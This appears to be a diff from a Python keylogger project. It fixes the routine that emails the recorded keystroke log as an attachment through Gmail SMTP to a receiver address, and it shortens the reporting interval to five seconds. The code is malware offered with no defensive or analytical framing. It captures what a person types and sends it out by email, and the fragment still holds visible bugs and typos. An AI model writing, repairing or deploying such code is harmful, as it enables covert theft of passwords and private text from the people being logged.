@@ -84,19 +84,21 @@ class keyLogger:
         #body and attatchments
         mime.attach(MIMEText(logstr, 'plain'))        
         attach_file_name = subject 
-        attatch_file = open(attatch_file_name, 'rb')
-        payload.set_payload((attatch_file).read())
+        attach_file = open(attach_file_name, 'rb')
+        
+        payload = MIMEBase('application', 'octate-stream')
+        payload.set_payload((attach_file).read())
         encoders.encode_base64(payload)#encodes attatchment
         #add header with filename
-        payload.add_header('Content-Decomposition', 'attachment', filename= attatch_file_name)
-        message.attach(payload)
+        payload.add_header('Content-Decomposition', 'attachment', filename= attach_file_name)
+        mime.attach(payload)
         
         #connect to mail server
         server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
         server.starttls()
         #logging in
         server.login(email, password)
-        text = message.as_string()
+        text = mime.as_string()
         server.sendmail(email, reciver, text)
         server.quit()
 
@@ -105,7 +107,7 @@ class keyLogger:
             self.endDate = datetime.now()
             self.handler()
             #emailing
-            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVER, self.log, self.filename)
+            self.carrierPidgeon(EMAIL, EMAILPASS, EMAILRECIVE, self.log, self.filename)
             self.log = ""
 
         timer = Timer(interval=self.interval, function=self.report)
@@ -124,6 +126,6 @@ class keyLogger:
 
 
 
-if __name__ = '__main__':
-    keyLogger(interval=SECINDAY)
-    keyLogger.start()
+if __name__ == "__main__":
+    keyLogger(interval=5)
+    keyLogger.start
